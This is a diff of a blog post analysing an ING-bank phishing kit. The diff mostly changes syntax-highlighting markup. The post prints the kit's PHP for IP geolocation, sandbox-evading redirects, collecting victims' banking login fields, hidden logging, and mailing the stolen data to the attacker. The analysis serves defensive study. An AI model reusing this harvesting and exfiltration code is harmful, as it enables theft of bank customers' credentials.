@@ -68,7 +68,7 @@ Let&rsquo;s start from the beginning I found this kit while analyzing the phishi
 
 	
 
-	<meta name="generator" content="Hugo 0.92.2" />
+	<meta name="generator" content="Hugo 0.104.3" />
     </head>
 
     
@@ -171,52 +171,52 @@ In this series of posts I am going to analyze and discuss some of the phishing k
 <h2 id="exploring-the-kit">Exploring the kit</h2>
 <p>This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.</p>
 <p>If we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mdls index.php
-_kMDItemDisplayNameWithExtensions      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>
-kMDItemContentCreationDate             <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
-kMDItemContentCreationDate_Ranking     <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
-kMDItemContentModificationDate         <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
-kMDItemContentModificationDate_Ranking <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
-kMDItemContentType                     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;public.php-script&#34;</span>
-</code></pre></div><h3 id="indexphp">index.php</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mdls index.php
+</span></span><span style="display:flex;"><span>_kMDItemDisplayNameWithExtensions      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>
+</span></span><span style="display:flex;"><span>kMDItemContentCreationDate             <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
+</span></span><span style="display:flex;"><span>kMDItemContentCreationDate_Ranking     <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
+</span></span><span style="display:flex;"><span>kMDItemContentModificationDate         <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
+</span></span><span style="display:flex;"><span>kMDItemContentModificationDate_Ranking <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
+</span></span><span style="display:flex;"><span>kMDItemContentType                     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;public.php-script&#34;</span>
+</span></span></code></pre></div><h3 id="indexphp">index.php</h3>
 <p>The entry point of the kit is <code>index.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-<span style="color:#a6e22e">session_start</span>();
-$ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($ip);
-$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://www.geoplugin.net/json.gp?ip=</span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>;
-<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">url_get_contents</span>($url) {
-    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>($url);
-    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
-    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_FOLLOWLOCATION</span>, <span style="color:#ae81ff">1</span>);
-    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYPEER</span>, <span style="color:#ae81ff">0</span>);
-    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYHOST</span>, <span style="color:#ae81ff">0</span>);
-    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
-    <span style="color:#a6e22e">curl_close</span>($ch);
-    <span style="color:#66d9ef">return</span> $data;
-}
-$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">url_get_contents</span>($url);
-$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($json, <span style="color:#66d9ef">true</span>);
-$country <span style="color:#f92672">=</span> $json[<span style="color:#e6db74">&#39;geoplugin_countryName&#39;</span>];
-<span style="color:#75715e"># if($country == &#34;Italy&#34; || $country == &#34;United Kingdom&#34; || $country == &#34;Bulgaria&#34;)  {
-</span><span style="color:#75715e"></span>
-$ban_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;logs/banlist.txt&#34;</span>;
-$list <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</span>($ban_file, <span style="color:#a6e22e">FILE_IGNORE_NEW_LINES</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">FILE_SKIP_EMPTY_LINES</span>);
-<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($ip, $list)) {
-    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: https://www.google.com&#34;</span>);
-    <span style="color:#66d9ef">die</span>();
-} <span style="color:#66d9ef">else</span> {
-    $_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
-    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php?&amp;sessionid=</span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">&amp;securessl=true&#34;</span>);
-    <span style="color:#66d9ef">die</span>();
-}
-<span style="color:#75715e">#}
-</span><span style="color:#75715e"># }
-</span><span style="color:#75715e"># else  {
-</span><span style="color:#75715e"># header(&#39;Location: https://www.google.com&#39;);
-</span><span style="color:#75715e"># }
-</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>Part of the code is commented out, indicating that the developer was testing different approaches.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($ip);
+</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://www.geoplugin.net/json.gp?ip=</span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">url_get_contents</span>($url) {
+</span></span><span style="display:flex;"><span>    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>($url);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_FOLLOWLOCATION</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYPEER</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYHOST</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_close</span>($ch);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $data;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">url_get_contents</span>($url);
+</span></span><span style="display:flex;"><span>$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($json, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$country <span style="color:#f92672">=</span> $json[<span style="color:#e6db74">&#39;geoplugin_countryName&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># if($country == &#34;Italy&#34; || $country == &#34;United Kingdom&#34; || $country == &#34;Bulgaria&#34;)  {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>$ban_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;logs/banlist.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>$list <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</span>($ban_file, <span style="color:#a6e22e">FILE_IGNORE_NEW_LINES</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">FILE_SKIP_EMPTY_LINES</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($ip, $list)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: https://www.google.com&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php?&amp;sessionid=</span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">&amp;securessl=true&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># else  {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># header(&#39;Location: https://www.google.com&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Part of the code is commented out, indicating that the developer was testing different approaches.</p>
 <p>In the lines above, the kit uses <a href="https://geoplugin.net">geoplugin.net</a> to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.</p>
 <p>The code is then referring to a file called <code>banlist.txt</code>, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. <code>banlist.txt</code> is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the <a href="https://www.andpalmier.com/posts/phishing-findings-2/">LinkedIn kit analyzed in a previous post</a>.</p>
 <p>In case the IP address of the victim is not in <code>banlist.txt</code>, the visitor is redirected to <code>login.php</code> with a new session ID, obtained from the md5 hash of the IP address.</p>
@@ -236,13 +236,13 @@ $list <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</spa
 
 <p>Actually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.</p>
 <p>Here is the form from the original ING page:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./loginsso.aspx&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript
-</span><span style="color:#e6db74">:return webform_onsubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
-</code></pre></div><p>while this is the one of the kit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pin.php?&amp;sessionid=&lt;?php echo </span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">; ?&gt;
-</span><span style="color:#e6db74">&amp;securessl=true&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:return WebForm_OnSubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span>
-<span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
-</code></pre></div><p>The <code>action</code> attribute is different and - again - we see a submission with the parameters <code>sessionid</code> and <code>securessl</code>, with the first still being the hash of the IP address of the visitor.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./loginsso.aspx&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">:return webform_onsubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>while this is the one of the kit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pin.php?&amp;sessionid=&lt;?php echo </span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">; ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&amp;securessl=true&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:return WebForm_OnSubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>The <code>action</code> attribute is different and - again - we see a submission with the parameters <code>sessionid</code> and <code>securessl</code>, with the first still being the hash of the IP address of the visitor.
 The fields submitted to the form are:</p>
 <ul>
 <li>Customer code, with input name <code>ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtcc</code></li>
@@ -259,110 +259,110 @@ The fields submitted to the form are:</p>
 
 <p>This page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don&rsquo;t worry, I will make a summary of the details of the process before the conclusion of this post!</p>
 <p>For now, let&rsquo;s focus on the code, here is the beginning of the PHP for <code>pin.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>])) {
-   <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: http://www.google.com&#34;</span>);
-   <span style="color:#66d9ef">die</span>();
-}
-
-$v_ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($v_ip);
-</code></pre></div><p>In the code above, the page is - once again - redirecting visitors which do not have the <code>auth</code> parameter to Google, to avoid detection.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>])) {
-    $codclient <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>];
-    $_SESSION[<span style="color:#e6db74">&#39;codclient&#39;</span>] <span style="color:#f92672">=</span> $codclient;
-}
-
-<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>])) {
-    $giorno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>];
-}
-
-<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>])) {
-    $mese <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>];
-}
-
-<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>])) {
-    $anno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>];
-}
-</code></pre></div><p>This section is taking the parameters sent from <code>login.php</code> and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>])) {
-    $telefono <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>];
-    <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;includes/my_email.php&#34;</span>;
-
-    <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;Europe/London&#39;</span>);
-    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-    $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;m-d-Y g:i:a&#34;</span>);
-    $agent <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>];
-
-    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Dati Login per </span><span style="color:#e6db74">$username\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| codcliente: &#34;</span><span style="color:#f92672">.</span>$codclient<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| giorno: &#34;</span><span style="color:#f92672">.</span>$giorno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| mese: &#34;</span><span style="color:#f92672">.</span>$mese<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| anno: &#34;</span><span style="color:#f92672">.</span>$anno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| telefono: &#34;</span><span style="color:#f92672">.</span>$telefono<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $footer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Sent from </span><span style="color:#e6db74">$v_ip</span><span style="color:#e6db74"> on </span><span style="color:#e6db74">$time</span><span style="color:#e6db74"> via </span><span style="color:#e6db74">$agent\n</span><span style="color:#e6db74">&#34;</span>;
-    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
-    $data <span style="color:#f92672">=</span> $msg <span style="color:#f92672">.</span> $footer;
-    $_SESSION[<span style="color:#e6db74">&#39;login_info&#39;</span>] <span style="color:#f92672">=</span> $msg;
-
-    $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;*********&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>); <span style="color:#75715e">// HIDING LOG FILE
-</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fputs</span>($fp,$data);
-    <span style="color:#a6e22e">fclose</span>($fp);
-    $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Poste Login Info for User: </span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#34;</span>;
-    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;From: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Reply-To: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-Type: text/plain; charset=utf-8</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-
-    <span style="color:#a6e22e">mail</span>($my_email,$subject,$data,$headers);
-}
-</code></pre></div><p>After assigning the last bit of information coming from <code>login.php</code> (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from <code>includes/my_email.php</code> and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>])) {
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: http://www.google.com&#34;</span>);
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$v_ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($v_ip);
+</span></span></code></pre></div><p>In the code above, the page is - once again - redirecting visitors which do not have the <code>auth</code> parameter to Google, to avoid detection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $codclient <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>];
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;codclient&#39;</span>] <span style="color:#f92672">=</span> $codclient;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $giorno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $mese <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $anno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>];
+</span></span><span style="display:flex;"><span>}
